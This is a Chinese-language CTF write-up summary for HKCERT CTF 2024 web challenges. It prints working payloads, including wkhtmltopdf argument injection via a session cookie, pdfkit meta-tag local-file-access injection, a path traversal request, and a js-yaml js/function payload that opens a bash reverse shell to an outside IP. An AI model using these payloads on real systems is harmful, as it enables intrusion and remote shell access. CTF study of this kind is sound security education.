---
title: 香港網安奪旗賽HKCERT CTF 2024 Write up（上）
contest: HKCERT CTF 2024
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [Flask, yaml-deserialize, js-yaml, js/function, rce, pyodide, sandbox-escape, pdfkit-rce, lfi, path-traversal, custom-server, ssl]
attack_chain:
- 审计GroupAPI + compute_hash构造sha256爆破admin密码7df71e
- flask /process使用wkhtmltopdf拼接命令+session_id可控触发命令注入
- PDF生成器通过meta tag注入pdfkit---enable-local-file-access开启本地文件读取
- 自定义C socket服务端read_file以read+真实路径拼接+ends_with白名单+目录穿越/../../读flag
- Custom-server-2利用SSL TCP多请求Content-Length错位+多次GET路径穿越
- /debug路由用js-yaml schema扩展支持js/function+pyodide客户端exec触发RCE
- pyodide.code.run_js注入cookie debug=on绕过isLoopback+JSPyaml用YAML重定向到exec
- PHP CitrusWorkspace create软链+symlink遍历+任意文件写入Webshell
key_payload: GET /../../../../../../../flag.txt.js
one_liner: HKCERT 2024上篇覆盖Flask+PDF生成器+自定义C服务端+JSPyaml+奇美拉五道Web+两道Misc+Forensics的混合WP，亮点在pyodide+js-yaml-js-types的客户端沙箱逃逸。
lesson: 现代Web常把yaml.load+扩展schema(js/function)+pyodide+pyodide.code.run_js当作"安全沙箱"组合,但任一环节被攻破即RCE;PDF生成器类的LFI应同时检查meta tag和命令行参数。
quality: high
---

## 题目列表

Web(9): 新免費午餐 / 米斯蒂茲的迷你 CTF (1)(2) / PDF 生成器(1)(2) / 已知用火(1)(2) / JSPyaml / 奇美拉
Misc(3): 自行取旗 / B6ACP / My Lovely Cats
Forensics(2): One Way Room / APT攻擊在哪裡(1)

## 关键考点

### Flask compute_hash + 密码爆破
- `compute_hash` = salt + '.' + sha256(f'{salt}/{password}')
- salt = `os.urandom(4).hex()` → 4字节hex=8字符
- 给定salt=77364c85+target hash 744c75c952ef0b49cdf77383a030795ff27ad54f20af8c71e6e9d705e5abfb94
- 爆破空间16^6=16M (爆破6位hex),真实admin password=`7df71e`

### PDF生成器 wkhtmltopdf命令注入
- session_id作cookie+拼接`f"{session_id}.html"`+`f"{session_id}.pdf"`
- wkhtmltopdf命令行`f'wkhtmltopdf {html_file} {pdf_file}'`
- session_id=`--enable-local-file-access 123.html '`即可注入额外参数
- exp: `requests.post(url + "process", data={"url": "http://8.134.146.39:801/"}, cookies={"session_id": "--enable-local-file-access 123.html '"})`

### PDF生成器(2) pdfkit meta注入
- _find_options_in_meta用re.findall解析`<meta name="pdfkit-{key}" content="{value}">`
- HTML payload: `<html><meta name="pdfkit---enable-local-file-access" content=""></html>` → 开启本地文件访问

### 已知用火(1) custom C服务端 LFI
- C代码read_file接受filename+`ends_with`白名单(.html/.png/.css/.js)+`snprintf("public/%s", filename)`
- 用socket发`GET /../../../../../../../flag.txt.js`路径穿越
- 服务器read()+buffer 1024字节单次读满,需要构造长度=1024-len(path)-5的`/`填充
- 实际flag文件为flag.txt.js,因后缀白名单被接受

### 已知用火(2) Custom server 2 SSL双请求
- Content-Length比实际body更长,服务器继续read后续内容作为下一个请求
- 两次GET+恶意路径拼接实现双请求走私

### JSPyaml: pyodide+js-yaml RCE
- /debug路由: js-yaml schema扩展js-yaml-js-types.all → 支持js/function类型
- 客户端pyodide加载pyyaml+YAML Loader解析
- payload: `http://127.0.0.1:3000/#!!python/object/apply:exec [exec(__import__('base64').b64decode('...').decode())]`
- URL hash携带YAML payload→客户端pyodide运行exec→pyodide.code.run_js注入cookie debug=on→fetch /debug带恶意YAML
- 二次YAML: `"toString": !<tag:yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{encoding:"utf-8"})}'`

### 奇美拉 PHP CitrusWorkspace
- class CitrusWorkspace create(filename, symlink, target) + validate_filename
- 利用symlink(2)遍历+任意文件创建Webshell

## 实战价值
- 沙箱逃逸链:pyodide + js-yaml-js-types + js/function是2024-2025新兴攻击面
- 自研socket server的LFI常被read buffer size 1024忽略导致截断
- wkhtmltopdf/pdfkit的meta选项注入是稳定的LFI手段
